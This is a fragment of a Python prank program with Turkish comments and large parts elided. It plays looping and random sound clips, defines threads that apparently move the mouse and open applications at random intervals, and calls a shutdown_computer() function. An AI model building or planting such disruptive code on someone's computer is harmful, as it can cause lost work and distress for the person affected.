...
def bg_sound():
    ...
    sound_path = os.path.join(base_path, "sounds", "smoke.mp3")
    try:
        pygame.mixer.music.load(sound_path)
        pygame.mixer.music.play(-1)  # Sonsuz döngüde çal
        print("Çalınıyor: smoke.mp3")
        while not stop_program:
            time.sleep(1)
...
def random_sound():
    ...
    sounds = [
        ...
        "spi.mp3", "what.mp3","eos.mp3","alsana.mp3","muhaha.mp3","lingangu.mp3",
    ...
    while not stop_program:
        ...
        try:
            ...
            time.sleep(sound.get_length())  # Ses bitene kadar bekle
        except pygame.error as e:
            print(f"Ses dosyası yüklenemedi: {e}")
...
def random_mouse_move():
    while not stop_program:
        time_to_wait = random.uniform(0.2, 0.4)
        time.sleep(time_to_wait)
...
def random_open_application():
    while not stop_program:
        time_to_wait = random.uniform(10, 20)
        time.sleep(time_to_wait)
...
if __name__ == "__main__":
    ...
    threading.Thread(target=bg_sound, daemon=True).start()
    shutdown_computer()
    listener.join()
